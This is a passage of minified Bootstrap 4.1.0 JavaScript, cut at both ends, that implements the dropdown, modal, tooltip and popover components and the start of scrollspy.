gi, mi, _i, vi, Ei, yi, bi = (me = "dropdown", ve = "." + (_e = "bs.dropdown"), Ee = ".data-api", ye = (ge = e).fn[me], be = new RegExp("38|40|27"), Te = { HIDE: "hide" + ve, HIDDEN: "hidden" + ve, SHOW: "show" + ve, SHOWN: "shown" + ve, CLICK: "click" + ve, CLICK_DATA_API: "click" + ve + Ee, KEYDOWN_DATA_API: "keydown" + ve + Ee, KEYUP_DATA_API: "keyup" + ve + Ee }, Ce = "disabled", we = "show", Ie = "dropup", De = "dropright", Ae = "dropleft", Se = "dropdown-menu-right", Oe = "position-static", Ne = '[data-toggle="dropdown"]', ke = ".dropdown form", Le = ".dropdown-menu", Pe = ".navbar-nav", xe = ".dropdown-menu .dropdown-item:not(.disabled):not(:disabled)", je = "top-start", Re = "top-end", Me = "bottom-start", He = "bottom-end", We = "right-start", Fe = "left-start", Ue = { offset: 0, flip: !0, boundary: "scrollParent", reference: "toggle", display: "dynamic" }, Be = { offset: "(number|string|function)", flip: "boolean", boundary: "(string|element)", reference: "(string|element)", display: "string" }, Ke = function () { function l(t, e) { this._element = t, this._popper = null, this._config = this._getConfig(e), this._menu = this._getMenuElement(), this._inNavbar = this._detectNavbar(), this._addEventListeners() } var t = l.prototype; return t.toggle = function () { if (!this._element.disabled && !ge(this._element).hasClass(Ce)) { var t = l._getParentFromElement(this._element), e = ge(this._menu).hasClass(we); if (l._clearMenus(), !e) { var n = { relatedTarget: this._element }, i = ge.Event(Te.SHOW, n); if (ge(t).trigger(i), !i.isDefaultPrevented()) { if (!this._inNavbar) { if ("undefined" == typeof pe) throw new TypeError("Bootstrap dropdown require Popper.js (https://popper.js.org)"); var r = this._element; "parent" === this._config.reference ? r = t : gt.isElement(this._config.reference) && (r = this._config.reference, "undefined" != typeof this._config.reference.jquery && (r = this._config.reference[0])), "scrollParent" !== this._config.boundary && ge(t).addClass(Oe), this._popper = new pe(r, this._menu, this._getPopperConfig()) } "ontouchstart" in document.documentElement && 0 === ge(t).closest(Pe).length && ge(document.body).children().on("mouseover", null, ge.noop), this._element.focus(), this._element.setAttribute("aria-expanded", !0), ge(this._menu).toggleClass(we), ge(t).toggleClass(we).trigger(ge.Event(Te.SHOWN, n)) } } } }, t.dispose = function () { ge.removeData(this._element, _e), ge(this._element).off(ve), this._element = null, (this._menu = null) !== this._popper && (this._popper.destroy(), this._popper = null) }, t.update = function () { this._inNavbar = this._detectNavbar(), null !== this._popper && this._popper.scheduleUpdate() }, t._addEventListeners = function () { var e = this; ge(this._element).on(Te.CLICK, function (t) { t.preventDefault(), t.stopPropagation(), e.toggle() }) }, t._getConfig = function (t) { return t = c({}, this.constructor.Default, ge(this._element).data(), t), gt.typeCheckConfig(me, t, this.constructor.DefaultType), t }, t._getMenuElement = function () { if (!this._menu) { var t = l._getParentFromElement(this._element); this._menu = ge(t).find(Le)[0] } return this._menu }, t._getPlacement = function () { var t = ge(this._element).parent(), e = Me; return t.hasClass(Ie) ? (e = je, ge(this._menu).hasClass(Se) && (e = Re)) : t.hasClass(De) ? e = We : t.hasClass(Ae) ? e = Fe : ge(this._menu).hasClass(Se) && (e = He), e }, t._detectNavbar = function () { return 0 < ge(this._element).closest(".navbar").length }, t._getPopperConfig = function () { var e = this, t = {}; "function" == typeof this._config.offset ? t.fn = function (t) { return t.offsets = c({}, t.offsets, e._config.offset(t.offsets) || {}), t } : t.offset = this._config.offset; var n = { placement: this._getPlacement(), modifiers: { offset: t, flip: { enabled: this._config.flip }, preventOverflow: { boundariesElement: this._config.boundary } } }; return "static" === this._config.display && (n.modifiers.applyStyle = { enabled: !1 }), n }, l._jQueryInterface = function (e) { return this.each(function () { var t = ge(this).data(_e); if (t || (t = new l(this, "object" == typeof e ? e : null), ge(this).data(_e, t)), "string" == typeof e) { if ("undefined" == typeof t[e]) throw new TypeError('No method named "' + e + '"'); t[e]() } }) }, l._clearMenus = function (t) { if (!t || 3 !== t.which && ("keyup" !== t.type || 9 === t.which)) for (var e = ge.makeArray(ge(Ne)), n = 0; n < e.length; n++) { var i = l._getParentFromElement(e[n]), r = ge(e[n]).data(_e), o = { relatedTarget: e[n] }; if (r) { var s = r._menu; if (ge(i).hasClass(we) && !(t && ("click" === t.type && /input|textarea/i.test(t.target.tagName) || "keyup" === t.type && 9 === t.which) && ge.contains(i, t.target))) { var a = ge.Event(Te.HIDE, o); ge(i).trigger(a), a.isDefaultPrevented() || ("ontouchstart" in document.documentElement && ge(document.body).children().off("mouseover", null, ge.noop), e[n].setAttribute("aria-expanded", "false"), ge(s).removeClass(we), ge(i).removeClass(we).trigger(ge.Event(Te.HIDDEN, o))) } } } }, l._getParentFromElement = function (t) { var e, n = gt.getSelectorFromElement(t); return n && (e = ge(n)[0]), e || t.parentNode }, l._dataApiKeydownHandler = function (t) { if ((/input|textarea/i.test(t.target.tagName) ? !(32 === t.which || 27 !== t.which && (40 !== t.which && 38 !== t.which || ge(t.target).closest(Le).length)) : be.test(t.which)) && (t.preventDefault(), t.stopPropagation(), !this.disabled && !ge(this).hasClass(Ce))) { var e = l._getParentFromElement(this), n = ge(e).hasClass(we); if ((n || 27 === t.which && 32 === t.which) && (!n || 27 !== t.which && 32 !== t.which)) { var i = ge(e).find(xe).get(); if (0 !== i.length) { var r = i.indexOf(t.target); 38 === t.which && 0 < r && r--, 40 === t.which && r < i.length - 1 && r++, r < 0 && (r = 0), i[r].focus() } } else { if (27 === t.which) { var o = ge(e).find(Ne)[0]; ge(o).trigger("focus") } ge(this).trigger("click") } } }, s(l, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return Ue } }, { key: "DefaultType", get: function () { return Be } }]), l }(), ge(document).on(Te.KEYDOWN_DATA_API, Ne, Ke._dataApiKeydownHandler).on(Te.KEYDOWN_DATA_API, Le, Ke._dataApiKeydownHandler).on(Te.CLICK_DATA_API + " " + Te.KEYUP_DATA_API, Ke._clearMenus).on(Te.CLICK_DATA_API, Ne, function (t) { t.preventDefault(), t.stopPropagation(), Ke._jQueryInterface.call(ge(this), "toggle") }).on(Te.CLICK_DATA_API, ke, function (t) { t.stopPropagation() }), ge.fn[me] = Ke._jQueryInterface, ge.fn[me].Constructor = Ke, ge.fn[me].noConflict = function () { return ge.fn[me] = ye, Ke._jQueryInterface }, Ke), Ti = (Qe = "modal", Ge = "." + (Ye = "bs.modal"), qe = (Ve = e).fn[Qe], ze = { backdrop: !0, keyboard: !0, focus: !0, show: !0 }, Xe = { backdrop: "(boolean|string)", keyboard: "boolean", focus: "boolean", show: "boolean" }, Je = { HIDE: "hide" + Ge, HIDDEN: "hidden" + Ge, SHOW: "show" + Ge, SHOWN: "shown" + Ge, FOCUSIN: "focusin" + Ge, RESIZE: "resize" + Ge, CLICK_DISMISS: "click.dismiss" + Ge, KEYDOWN_DISMISS: "keydown.dismiss" + Ge, MOUSEUP_DISMISS: "mouseup.dismiss" + Ge, MOUSEDOWN_DISMISS: "mousedown.dismiss" + Ge, CLICK_DATA_API: "click" + Ge + ".data-api" }, Ze = "modal-scrollbar-measure", $e = "modal-backdrop", tn = "modal-open", en = "fade", nn = "show", rn = { DIALOG: ".modal-dialog", DATA_TOGGLE: '[data-toggle="modal"]', DATA_DISMISS: '[data-dismiss="modal"]', FIXED_CONTENT: ".fixed-top, .fixed-bottom, .is-fixed, .sticky-top", STICKY_CONTENT: ".sticky-top", NAVBAR_TOGGLER: ".navbar-toggler" }, on = function () { function r(t, e) { this._config = this._getConfig(e), this._element = t, this._dialog = Ve(t).find(rn.DIALOG)[0], this._backdrop = null, this._isShown = !1, this._isBodyOverflowing = !1, this._ignoreBackdropClick = !1, this._scrollbarWidth = 0 } var t = r.prototype; return t.toggle = function (t) { return this._isShown ? this.hide() : this.show(t) }, t.show = function (t) { var e = this; if (!this._isTransitioning && !this._isShown) { Ve(this._element).hasClass(en) && (this._isTransitioning = !0); var n = Ve.Event(Je.SHOW, { relatedTarget: t }); Ve(this._element).trigger(n), this._isShown || n.isDefaultPrevented() || (this._isShown = !0, this._checkScrollbar(), this._setScrollbar(), this._adjustDialog(), Ve(document.body).addClass(tn), this._setEscapeEvent(), this._setResizeEvent(), Ve(this._element).on(Je.CLICK_DISMISS, rn.DATA_DISMISS, function (t) { return e.hide(t) }), Ve(this._dialog).on(Je.MOUSEDOWN_DISMISS, function () { Ve(e._element).one(Je.MOUSEUP_DISMISS, function (t) { Ve(t.target).is(e._element) && (e._ignoreBackdropClick = !0) }) }), this._showBackdrop(function () { return e._showElement(t) })) } }, t.hide = function (t) { var e = this; if (t && t.preventDefault(), !this._isTransitioning && this._isShown) { var n = Ve.Event(Je.HIDE); if (Ve(this._element).trigger(n), this._isShown && !n.isDefaultPrevented()) { this._isShown = !1; var i = Ve(this._element).hasClass(en); if (i && (this._isTransitioning = !0), this._setEscapeEvent(), this._setResizeEvent(), Ve(document).off(Je.FOCUSIN), Ve(this._element).removeClass(nn), Ve(this._element).off(Je.CLICK_DISMISS), Ve(this._dialog).off(Je.MOUSEDOWN_DISMISS), i) { var r = gt.getTransitionDurationFromElement(this._element); Ve(this._element).one(gt.TRANSITION_END, function (t) { return e._hideModal(t) }).emulateTransitionEnd(r) } else this._hideModal() } } }, t.dispose = function () { Ve.removeData(this._element, Ye), Ve(window, document, this._element, this._backdrop).off(Ge), this._config = null, this._element = null, this._dialog = null, this._backdrop = null, this._isShown = null, this._isBodyOverflowing = null, this._ignoreBackdropClick = null, this._scrollbarWidth = null }, t.handleUpdate = function () { this._adjustDialog() }, t._getConfig = function (t) { return t = c({}, ze, t), gt.typeCheckConfig(Qe, t, Xe), t }, t._showElement = function (t) { var e = this, n = Ve(this._element).hasClass(en); this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE || document.body.appendChild(this._element), this._element.style.display = "block", this._element.removeAttribute("aria-hidden"), this._element.scrollTop = 0, n && gt.reflow(this._element), Ve(this._element).addClass(nn), this._config.focus && this._enforceFocus(); var i = Ve.Event(Je.SHOWN, { relatedTarget: t }), r = function () { e._config.focus && e._element.focus(), e._isTransitioning = !1, Ve(e._element).trigger(i) }; if (n) { var o = gt.getTransitionDurationFromElement(this._element); Ve(this._dialog).one(gt.TRANSITION_END, r).emulateTransitionEnd(o) } else r() }, t._enforceFocus = function () { var e = this; Ve(document).off(Je.FOCUSIN).on(Je.FOCUSIN, function (t) { document !== t.target && e._element !== t.target && 0 === Ve(e._element).has(t.target).length && e._element.focus() }) }, t._setEscapeEvent = function () { var e = this; this._isShown && this._config.keyboard ? Ve(this._element).on(Je.KEYDOWN_DISMISS, function (t) { 27 === t.which && (t.preventDefault(), e.hide()) }) : this._isShown || Ve(this._element).off(Je.KEYDOWN_DISMISS) }, t._setResizeEvent = function () { var e = this; this._isShown ? Ve(window).on(Je.RESIZE, function (t) { return e.handleUpdate(t) }) : Ve(window).off(Je.RESIZE) }, t._hideModal = function () { var t = this; this._element.style.display = "none", this._element.setAttribute("aria-hidden", !0), this._isTransitioning = !1, this._showBackdrop(function () { Ve(document.body).removeClass(tn), t._resetAdjustments(), t._resetScrollbar(), Ve(t._element).trigger(Je.HIDDEN) }) }, t._removeBackdrop = function () { this._backdrop && (Ve(this._backdrop).remove(), this._backdrop = null) }, t._showBackdrop = function (t) { var e = this, n = Ve(this._element).hasClass(en) ? en : ""; if (this._isShown && this._config.backdrop) { if (this._backdrop = document.createElement("div"), this._backdrop.className = $e, n && Ve(this._backdrop).addClass(n), Ve(this._backdrop).appendTo(document.body), Ve(this._element).on(Je.CLICK_DISMISS, function (t) { e._ignoreBackdropClick ? e._ignoreBackdropClick = !1 : t.target === t.currentTarget && ("static" === e._config.backdrop ? e._element.focus() : e.hide()) }), n && gt.reflow(this._backdrop), Ve(this._backdrop).addClass(nn), !t) return; if (!n) return void t(); var i = gt.getTransitionDurationFromElement(this._backdrop); Ve(this._backdrop).one(gt.TRANSITION_END, t).emulateTransitionEnd(i) } else if (!this._isShown && this._backdrop) { Ve(this._backdrop).removeClass(nn); var r = function () { e._removeBackdrop(), t && t() }; if (Ve(this._element).hasClass(en)) { var o = gt.getTransitionDurationFromElement(this._backdrop); Ve(this._backdrop).one(gt.TRANSITION_END, r).emulateTransitionEnd(o) } else r() } else t && t() }, t._adjustDialog = function () { var t = this._element.scrollHeight > document.documentElement.clientHeight; !this._isBodyOverflowing && t && (this._element.style.paddingLeft = this._scrollbarWidth + "px"), this._isBodyOverflowing && !t && (this._element.style.paddingRight = this._scrollbarWidth + "px") }, t._resetAdjustments = function () { this._element.style.paddingLeft = "", this._element.style.paddingRight = "" }, t._checkScrollbar = function () { var t = document.body.getBoundingClientRect(); this._isBodyOverflowing = t.left + t.right < window.innerWidth, this._scrollbarWidth = this._getScrollbarWidth() }, t._setScrollbar = function () { var r = this; if (this._isBodyOverflowing) { Ve(rn.FIXED_CONTENT).each(function (t, e) { var n = Ve(e)[0].style.paddingRight, i = Ve(e).css("padding-right"); Ve(e).data("padding-right", n).css("padding-right", parseFloat(i) + r._scrollbarWidth + "px") }), Ve(rn.STICKY_CONTENT).each(function (t, e) { var n = Ve(e)[0].style.marginRight, i = Ve(e).css("margin-right"); Ve(e).data("margin-right", n).css("margin-right", parseFloat(i) - r._scrollbarWidth + "px") }), Ve(rn.NAVBAR_TOGGLER).each(function (t, e) { var n = Ve(e)[0].style.marginRight, i = Ve(e).css("margin-right"); Ve(e).data("margin-right", n).css("margin-right", parseFloat(i) + r._scrollbarWidth + "px") }); var t = document.body.style.paddingRight, e = Ve(document.body).css("padding-right"); Ve(document.body).data("padding-right", t).css("padding-right", parseFloat(e) + this._scrollbarWidth + "px") } }, t._resetScrollbar = function () { Ve(rn.FIXED_CONTENT).each(function (t, e) { var n = Ve(e).data("padding-right"); "undefined" != typeof n && Ve(e).css("padding-right", n).removeData("padding-right") }), Ve(rn.STICKY_CONTENT + ", " + rn.NAVBAR_TOGGLER).each(function (t, e) { var n = Ve(e).data("margin-right"); "undefined" != typeof n && Ve(e).css("margin-right", n).removeData("margin-right") }); var t = Ve(document.body).data("padding-right"); "undefined" != typeof t && Ve(document.body).css("padding-right", t).removeData("padding-right") }, t._getScrollbarWidth = function () { var t = document.createElement("div"); t.className = Ze, document.body.appendChild(t); var e = t.getBoundingClientRect().width - t.clientWidth; return document.body.removeChild(t), e }, r._jQueryInterface = function (n, i) { return this.each(function () { var t = Ve(this).data(Ye), e = c({}, r.Default, Ve(this).data(), "object" == typeof n && n); if (t || (t = new r(this, e), Ve(this).data(Ye, t)), "string" == typeof n) { if ("undefined" == typeof t[n]) throw new TypeError('No method named "' + n + '"'); t[n](i) } else e.show && t.show(i) }) }, s(r, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return ze } }]), r }(), Ve(document).on(Je.CLICK_DATA_API, rn.DATA_TOGGLE, function (t) { var e, n = this, i = gt.getSelectorFromElement(this); i && (e = Ve(i)[0]); var r = Ve(e).data(Ye) ? "toggle" : c({}, Ve(e).data(), Ve(this).data()); "A" !== this.tagName && "AREA" !== this.tagName || t.preventDefault(); var o = Ve(e).one(Je.SHOW, function (t) { t.isDefaultPrevented() || o.one(Je.HIDDEN, function () { Ve(n).is(":visible") && n.focus() }) }); on._jQueryInterface.call(Ve(e), r, this) }), Ve.fn[Qe] = on._jQueryInterface, Ve.fn[Qe].Constructor = on, Ve.fn[Qe].noConflict = function () { return Ve.fn[Qe] = qe, on._jQueryInterface }, on), Ci = (an = "tooltip", cn = "." + (ln = "bs.tooltip"), fn = (sn = e).fn[an], hn = "bs-tooltip", un = new RegExp("(^|\\s)" + hn + "\\S+", "g"), gn = { animation: !0, template: '<div class="tooltip" role="tooltip"><div class="arrow"></div><div class="tooltip-inner"></div></div>', trigger: "hover focus", title: "", delay: 0, html: !(pn = { AUTO: "auto", TOP: "top", RIGHT: "right", BOTTOM: "bottom", LEFT: "left" }), selector: !(dn = { animation: "boolean", template: "string", title: "(string|element|function)", trigger: "string", delay: "(number|object)", html: "boolean", selector: "(string|boolean)", placement: "(string|function)", offset: "(number|string)", container: "(string|element|boolean)", fallbackPlacement: "(string|array)", boundary: "(string|element)" }), placement: "top", offset: 0, container: !1, fallbackPlacement: "flip", boundary: "scrollParent" }, _n = "out", vn = { HIDE: "hide" + cn, HIDDEN: "hidden" + cn, SHOW: (mn = "show") + cn, SHOWN: "shown" + cn, INSERTED: "inserted" + cn, CLICK: "click" + cn, FOCUSIN: "focusin" + cn, FOCUSOUT: "focusout" + cn, MOUSEENTER: "mouseenter" + cn, MOUSELEAVE: "mouseleave" + cn }, En = "fade", yn = "show", bn = ".tooltip-inner", Tn = ".arrow", Cn = "hover", wn = "focus", In = "click", Dn = "manual", An = function () { function i(t, e) { if ("undefined" == typeof pe) throw new TypeError("Bootstrap tooltips require Popper.js (https://popper.js.org)"); this._isEnabled = !0, this._timeout = 0, this._hoverState = "", this._activeTrigger = {}, this._popper = null, this.element = t, this.config = this._getConfig(e), this.tip = null, this._setListeners() } var t = i.prototype; return t.enable = function () { this._isEnabled = !0 }, t.disable = function () { this._isEnabled = !1 }, t.toggleEnabled = function () { this._isEnabled = !this._isEnabled }, t.toggle = function (t) { if (this._isEnabled) if (t) { var e = this.constructor.DATA_KEY, n = sn(t.currentTarget).data(e); n || (n = new this.constructor(t.currentTarget, this._getDelegateConfig()), sn(t.currentTarget).data(e, n)), n._activeTrigger.click = !n._activeTrigger.click, n._isWithActiveTrigger() ? n._enter(null, n) : n._leave(null, n) } else { if (sn(this.getTipElement()).hasClass(yn)) return void this._leave(null, this); this._enter(null, this) } }, t.dispose = function () { clearTimeout(this._timeout), sn.removeData(this.element, this.constructor.DATA_KEY), sn(this.element).off(this.constructor.EVENT_KEY), sn(this.element).closest(".modal").off("hide.bs.modal"), this.tip && sn(this.tip).remove(), this._isEnabled = null, this._timeout = null, this._hoverState = null, (this._activeTrigger = null) !== this._popper && this._popper.destroy(), this._popper = null, this.element = null, this.config = null, this.tip = null }, t.show = function () { var e = this; if ("none" === sn(this.element).css("display")) throw new Error("Please use show on visible elements"); var t = sn.Event(this.constructor.Event.SHOW); if (this.isWithContent() && this._isEnabled) { sn(this.element).trigger(t); var n = sn.contains(this.element.ownerDocument.documentElement, this.element); if (t.isDefaultPrevented() || !n) return; var i = this.getTipElement(), r = gt.getUID(this.constructor.NAME); i.setAttribute("id", r), this.element.setAttribute("aria-describedby", r), this.setContent(), this.config.animation && sn(i).addClass(En); var o = "function" == typeof this.config.placement ? this.config.placement.call(this, i, this.element) : this.config.placement, s = this._getAttachment(o); this.addAttachmentClass(s); var a = !1 === this.config.container ? document.body : sn(this.config.container); sn(i).data(this.constructor.DATA_KEY, this), sn.contains(this.element.ownerDocument.documentElement, this.tip) || sn(i).appendTo(a), sn(this.element).trigger(this.constructor.Event.INSERTED), this._popper = new pe(this.element, i, { placement: s, modifiers: { offset: { offset: this.config.offset }, flip: { behavior: this.config.fallbackPlacement }, arrow: { element: Tn }, preventOverflow: { boundariesElement: this.config.boundary } }, onCreate: function (t) { t.originalPlacement !== t.placement && e._handlePopperPlacementChange(t) }, onUpdate: function (t) { e._handlePopperPlacementChange(t) } }), sn(i).addClass(yn), "ontouchstart" in document.documentElement && sn(document.body).children().on("mouseover", null, sn.noop); var l = function () { e.config.animation && e._fixTransition(); var t = e._hoverState; e._hoverState = null, sn(e.element).trigger(e.constructor.Event.SHOWN), t === _n && e._leave(null, e) }; if (sn(this.tip).hasClass(En)) { var c = gt.getTransitionDurationFromElement(this.tip); sn(this.tip).one(gt.TRANSITION_END, l).emulateTransitionEnd(c) } else l() } }, t.hide = function (t) { var e = this, n = this.getTipElement(), i = sn.Event(this.constructor.Event.HIDE), r = function () { e._hoverState !== mn && n.parentNode && n.parentNode.removeChild(n), e._cleanTipClass(), e.element.removeAttribute("aria-describedby"), sn(e.element).trigger(e.constructor.Event.HIDDEN), null !== e._popper && e._popper.destroy(), t && t() }; if (sn(this.element).trigger(i), !i.isDefaultPrevented()) { if (sn(n).removeClass(yn), "ontouchstart" in document.documentElement && sn(document.body).children().off("mouseover", null, sn.noop), this._activeTrigger[In] = !1, this._activeTrigger[wn] = !1, this._activeTrigger[Cn] = !1, sn(this.tip).hasClass(En)) { var o = gt.getTransitionDurationFromElement(n); sn(n).one(gt.TRANSITION_END, r).emulateTransitionEnd(o) } else r(); this._hoverState = "" } }, t.update = function () { null !== this._popper && this._popper.scheduleUpdate() }, t.isWithContent = function () { return Boolean(this.getTitle()) }, t.addAttachmentClass = function (t) { sn(this.getTipElement()).addClass(hn + "-" + t) }, t.getTipElement = function () { return this.tip = this.tip || sn(this.config.template)[0], this.tip }, t.setContent = function () { var t = sn(this.getTipElement()); this.setElementContent(t.find(bn), this.getTitle()), t.removeClass(En + " " + yn) }, t.setElementContent = function (t, e) { var n = this.config.html; "object" == typeof e && (e.nodeType || e.jquery) ? n ? sn(e).parent().is(t) || t.empty().append(e) : t.text(sn(e).text()) : t[n ? "html" : "text"](e) }, t.getTitle = function () { var t = this.element.getAttribute("data-original-title"); return t || (t = "function" == typeof this.config.title ? this.config.title.call(this.element) : this.config.title), t }, t._getAttachment = function (t) { return pn[t.toUpperCase()] }, t._setListeners = function () { var i = this; this.config.trigger.split(" ").forEach(function (t) { if ("click" === t) sn(i.element).on(i.constructor.Event.CLICK, i.config.selector, function (t) { return i.toggle(t) }); else if (t !== Dn) { var e = t === Cn ? i.constructor.Event.MOUSEENTER : i.constructor.Event.FOCUSIN, n = t === Cn ? i.constructor.Event.MOUSELEAVE : i.constructor.Event.FOCUSOUT; sn(i.element).on(e, i.config.selector, function (t) { return i._enter(t) }).on(n, i.config.selector, function (t) { return i._leave(t) }) } sn(i.element).closest(".modal").on("hide.bs.modal", function () { return i.hide() }) }), this.config.selector ? this.config = c({}, this.config, { trigger: "manual", selector: "" }) : this._fixTitle() }, t._fixTitle = function () { var t = typeof this.element.getAttribute("data-original-title"); (this.element.getAttribute("title") || "string" !== t) && (this.element.setAttribute("data-original-title", this.element.getAttribute("title") || ""), this.element.setAttribute("title", "")) }, t._enter = function (t, e) { var n = this.constructor.DATA_KEY; (e = e || sn(t.currentTarget).data(n)) || (e = new this.constructor(t.currentTarget, this._getDelegateConfig()), sn(t.currentTarget).data(n, e)), t && (e._activeTrigger["focusin" === t.type ? wn : Cn] = !0), sn(e.getTipElement()).hasClass(yn) || e._hoverState === mn ? e._hoverState = mn : (clearTimeout(e._timeout), e._hoverState = mn, e.config.delay && e.config.delay.show ? e._timeout = setTimeout(function () { e._hoverState === mn && e.show() }, e.config.delay.show) : e.show()) }, t._leave = function (t, e) { var n = this.constructor.DATA_KEY; (e = e || sn(t.currentTarget).data(n)) || (e = new this.constructor(t.currentTarget, this._getDelegateConfig()), sn(t.currentTarget).data(n, e)), t && (e._activeTrigger["focusout" === t.type ? wn : Cn] = !1), e._isWithActiveTrigger() || (clearTimeout(e._timeout), e._hoverState = _n, e.config.delay && e.config.delay.hide ? e._timeout = setTimeout(function () { e._hoverState === _n && e.hide() }, e.config.delay.hide) : e.hide()) }, t._isWithActiveTrigger = function () { for (var t in this._activeTrigger) if (this._activeTrigger[t]) return !0; return !1 }, t._getConfig = function (t) { return "number" == typeof (t = c({}, this.constructor.Default, sn(this.element).data(), t)).delay && (t.delay = { show: t.delay, hide: t.delay }), "number" == typeof t.title && (t.title = t.title.toString()), "number" == typeof t.content && (t.content = t.content.toString()), gt.typeCheckConfig(an, t, this.constructor.DefaultType), t }, t._getDelegateConfig = function () { var t = {}; if (this.config) for (var e in this.config) this.constructor.Default[e] !== this.config[e] && (t[e] = this.config[e]); return t }, t._cleanTipClass = function () { var t = sn(this.getTipElement()), e = t.attr("class").match(un); null !== e && 0 < e.length && t.removeClass(e.join("")) }, t._handlePopperPlacementChange = function (t) { this._cleanTipClass(), this.addAttachmentClass(this._getAttachment(t.placement)) }, t._fixTransition = function () { var t = this.getTipElement(), e = this.config.animation; null === t.getAttribute("x-placement") && (sn(t).removeClass(En), this.config.animation = !1, this.hide(), this.show(), this.config.animation = e) }, i._jQueryInterface = function (n) { return this.each(function () { var t = sn(this).data(ln), e = "object" == typeof n && n; if ((t || !/dispose|hide/.test(n)) && (t || (t = new i(this, e), sn(this).data(ln, t)), "string" == typeof n)) { if ("undefined" == typeof t[n]) throw new TypeError('No method named "' + n + '"'); t[n]() } }) }, s(i, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return gn } }, { key: "NAME", get: function () { return an } }, { key: "DATA_KEY", get: function () { return ln } }, { key: "Event", get: function () { return vn } }, { key: "EVENT_KEY", get: function () { return cn } }, { key: "DefaultType", get: function () { return dn } }]), i }(), sn.fn[an] = An._jQueryInterface, sn.fn[an].Constructor = An, sn.fn[an].noConflict = function () { return sn.fn[an] = fn, An._jQueryInterface }, An), wi = (On = "popover", kn = "." + (Nn = "bs.popover"), Ln = (Sn = e).fn[On], Pn = "bs-popover", xn = new RegExp("(^|\\s)" + Pn + "\\S+", "g"), jn = c({}, Ci.Default, { placement: "right", trigger: "click", content: "", template: '<div class="popover" role="tooltip"><div class="arrow"></div><h3 class="popover-header"></h3><div class="popover-body"></div></div>' }), Rn = c({}, Ci.DefaultType, { content: "(string|element|function)" }), Mn = "fade", Wn = ".popover-header", Fn = ".popover-body", Un = { HIDE: "hide" + kn, HIDDEN: "hidden" + kn, SHOW: (Hn = "show") + kn, SHOWN: "shown" + kn, INSERTED: "inserted" + kn, CLICK: "click" + kn, FOCUSIN: "focusin" + kn, FOCUSOUT: "focusout" + kn, MOUSEENTER: "mouseenter" + kn, MOUSELEAVE: "mouseleave" + kn }, Bn = function (t) { var e, n; function i() { return t.apply(this, arguments) || this } n = t, (e = i).prototype = Object.create(n.prototype), (e.prototype.constructor = e).__proto__ = n; var r = i.prototype; return r.isWithContent = function () { return this.getTitle() || this._getContent() }, r.addAttachmentClass = function (t) { Sn(this.getTipElement()).addClass(Pn + "-" + t) }, r.getTipElement = function () { return this.tip = this.tip || Sn(this.config.template)[0], this.tip }, r.setContent = function () { var t = Sn(this.getTipElement()); this.setElementContent(t.find(Wn), this.getTitle()); var e = this._getContent(); "function" == typeof e && (e = e.call(this.element)), this.setElementContent(t.find(Fn), e), t.removeClass(Mn + " " + Hn) }, r._getContent = function () { return this.element.getAttribute("data-content") || this.config.content }, r._cleanTipClass = function () { var t = Sn(this.getTipElement()), e = t.attr("class").match(xn); null !== e && 0 < e.length && t.removeClass(e.join("")) }, i._jQueryInterface = function (n) { return this.each(function () { var t = Sn(this).data(Nn), e = "object" == typeof n ? n : null; if ((t || !/destroy|hide/.test(n)) && (t || (t = new i(this, e), Sn(this).data(Nn, t)), "string" == typeof n)) { if ("undefined" == typeof t[n]) throw new TypeError('No method named "' + n + '"'); t[n]() } }) }, s(i, null, [{ key: "VERSION", get: function () { return "4.1.0" } }, { key: "Default", get: function () { return jn } }, { key: "NAME", get: function () { return On } }, { key: "DATA_KEY", get: function () { return Nn } }, { key: "Event", get: function () { return Un } }, { key: "EVENT_KEY", get: function () { return kn } }, { key: "DefaultType", get: function () { return Rn } }]), i }(Ci), Sn.fn[On] = Bn._jQueryInterface, Sn.fn[On].Constructor = Bn, Sn.fn[On].noConflict = function () { return Sn.fn[On] = Ln, Bn._jQueryInterface }, Bn), Ii = (Vn = "scrollspy", Yn = "." + (Qn = "bs.scrollspy"), Gn = (Kn = e).fn[Vn], qn = { offset: 10, method: "auto", target: "" }, zn = { offset: "number", method: "string", target: "(string|element)" }, Xn = { ACTIVATE: "activate" + Yn, SCROLL: "scroll" + Yn, LOAD_DATA_API: "load" + Yn + ".data-api" }, Jn = "dropdown-item", Zn = "active", $n = { DATA_SPY: '[data-spy="scroll"]', ACTIVE: ".active", NAV_LIST_GROUP: ".nav, .list-group", NAV_LINKS: ".nav-link", NAV_ITEMS: ".nav-item", LIST_ITEMS: ".list-group-item", DROPDOWN: ".dropdown", DROPDOWN_ITEMS: ".dropdown-item", DROPDOWN_TOGGLE: ".dropdown-toggle" }, ti = "offset", ei = "position", ni = function () { function n(t, e) { var n = this; this._element = t, this._scrollElement = "BODY" === t.tagName ? window : t, this._config = this._getConfig(e), this._selector = this._config.target + " " + $n.NAV_LINKS + "," + this._config.target + " " + $n.LIST_ITEMS + "," + this._config.target + " " + $n.DROPDOWN_ITEMS, this._offsets = [], this._targets = [], this._activeTarget = null, this._scrollHeight = 0, Kn(this._scrollElement).on(Xn.SCROLL, function (t) { return n._process(t) }), this.refresh(), this._process() } var t = n.prototype; return t.refresh = function () { var e = this, t = this._scrollElement === this._scrollElement.window ? ti : ei, r = "auto" === this._config.method ? t : this._config.method, o = r === ei ? this._getScrollTop() : 0; this._offsets = [], this._targets = [], this._scrollHeight = this._getScrollHeight(), Kn.makeArray(Kn(this._selector)).map(function (t) { var e, n = gt.getSelectorFromElement(t); if (n && (e = Kn(n)[0]), e) { var i = e.getBoundingClientRect(); if (i.width || i.height) return [Kn(e)[r]().top + o, n] } return null }).filter(function (t) { return t }).sort(function (t, e) { return t[0] - e[0] }).forEach(function (t) { e._offsets.push(t[0]), e._targets.push(t[1]) }) }, t.dispose = function () { Kn.removeData(this._element, Qn), Kn(this._scrollElement).off(Yn), this._element = null, this._scrollElement = null, this._config = null, this._selector = null, this._offsets = null, this._targets = null, this._activeTarget = null, this._scrollHeight = null }, t._getConfig = function (t) { if ("string" != typeof (t = c({}, qn, t)).target) { var e = Kn(t.target).attr("id"); e || (e = gt.getUID(Vn), Kn(t.target).attr("id", e)), t.target = "#" + e } return gt.typeCheckConfig(Vn, t, zn), t }, t._getScrollTop = function () { return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop }, t._getScrollHeight = function () { return this._scrollElement.scrollHeight || 